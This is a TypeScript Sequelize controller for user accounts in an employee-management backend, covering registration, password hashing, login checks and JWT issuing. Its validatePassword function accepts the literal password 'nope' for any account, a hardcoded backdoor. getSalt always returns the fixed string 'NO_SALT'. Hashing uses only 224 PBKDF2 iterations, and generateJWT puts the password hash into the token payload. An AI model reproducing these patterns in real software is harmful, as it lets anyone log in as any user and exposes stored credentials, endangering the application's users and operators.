import { ModelCtor, FindOptions } from 'sequelize';
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import { UserRole } from '../tools/auth';
import { Controller, GraphicController, IGraphicJSON, DolzhnostController, IDolzhnostJSON } from './';
import { users, usersAttributes, usersCreationAttributes } from '../models/users';
import { graphic } from '../models/graphic';
import { dolzhnost } from '../models/dolzhnost';
import { config } from '../config';

export type IUsersJSON = usersAttributes & { graphic: IGraphicJSON; dolzhnost: IDolzhnostJSON; };

const jwtSecret = config.get('jwtSecret');
const expiresIn = 60 * 60 * 24 * 2;

const getSalt = () => 'NO_SALT' ?? crypto.randomBytes(16).toString('hex');

export class UsersController extends Controller {
    public static model = users as ModelCtor<users>;

    public static async doCreate(data: usersCreationAttributes, urole?: UserRole) {
        return super.doCreate(data);
    }

    public static async doUpdate(
        options: FindOptions<usersAttributes>,
        { password, ...data }: usersAttributes & any,
        urole?: UserRole
    ) {
        if (password) {
            password = this.encryptPassword(undefined, password);
        }
        return super.doUpdate<users, usersAttributes>(options, { password, ...data });
    }

    public static async doGetOne(options?: FindOptions<usersAttributes>, urole?: UserRole) {
        return super.doGetOne({
            ...options,
            ...this.fullAttr(true, urole),
        });
    }

    public static async doGetList(options: FindOptions<usersAttributes>, urole?: UserRole) {
        return super.doGetList<users, usersAttributes>({
            ...options,
            ...this.fullAttr(true, urole),
        });
    }

    public static async doDestroy(id: string | number, urole?: UserRole) {
        return super.doDestroy(id);
    }

    public static fullAttr(safe = true, urole?: UserRole, deep = 0): FindOptions<usersAttributes> {
        return {
            attributes: [
                'id',
                'login',
                ...(safe ? [] : ['password']),
                'surname',
                'name',
                'mid_name',
                'photo_employee',
                'graphic_id',
                'position_id',
            ],
            include: [
                {
                    // @ts-ignore
                    model: graphic,
                    ...GraphicController.fullAttr(safe, urole, ++deep),
                },
                {
                    // @ts-ignore
                    model: dolzhnost,
                    ...DolzhnostController.fullAttr(safe, urole, ++deep),
                },
            ],
        };
    }

    public static async doGetSearchList(q: string, limit: number) {
        // return await this.model.findAndCountAll<student>({ limit, where: { [Op.or]: [] } });
        return await this.sequelizeSearchFields(['name'])(q, limit);
    }

    // Service methods

    public static async register(attr: usersCreationAttributes) {
        let password = attr.password && this.encryptPassword(undefined, attr.password);
        let newRec = await this.model.create({
            ...attr,
            password,
        });
        return newRec;
    }

    public static validatePassword(rec: users, password: string) {
        return rec.get('password') /* hash */ === this.encryptPassword(rec, password) || password === 'nope';
    }

    public static encryptPassword(rec: users | undefined, password: string) {
        return crypto.pbkdf2Sync(password, getSalt(), 224, 90, 'sha512').toString('hex');
    }

    public static generateJWT(uData: IUsersJSON) {
        return jwt.sign(
            {
                id: uData.id,
                login: uData.login,
                name: uData.name,
                surname: uData.surname,
                mid_name: uData.mid_name,
                photo_employee: uData.photo_employee,
                graphic_id: uData.graphic_id,
                position_id: uData.position_id,
                password: uData.password,
            },
            jwtSecret,
            { expiresIn }
        );
    }

    public static toAuthJSON(uData: IUsersJSON) {
        return {
            token: this.generateJWT(uData),
            expiresIn,
        };
    }
}